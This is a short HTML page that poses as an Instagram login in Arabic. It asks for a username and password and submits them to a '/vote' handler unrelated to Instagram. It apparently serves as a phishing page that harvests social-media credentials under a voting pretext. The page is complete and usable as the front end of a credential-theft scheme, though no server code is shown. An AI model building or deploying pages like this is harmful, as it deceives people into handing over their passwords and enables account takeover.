<!DOCTYPE html>
<html>
<head>
    <title>Instagram تسجيل الدخول</title>
</head>
<body>
    <h2>يرجى إدخال بيانات الدخول الخاصة بك:</h2>
    <form action="/vote" method="post">
        <label for="username">اسم المستخدم:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">كلمة المرور:</label>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="تسجيل الدخول">
    </form>
</body>
</html>
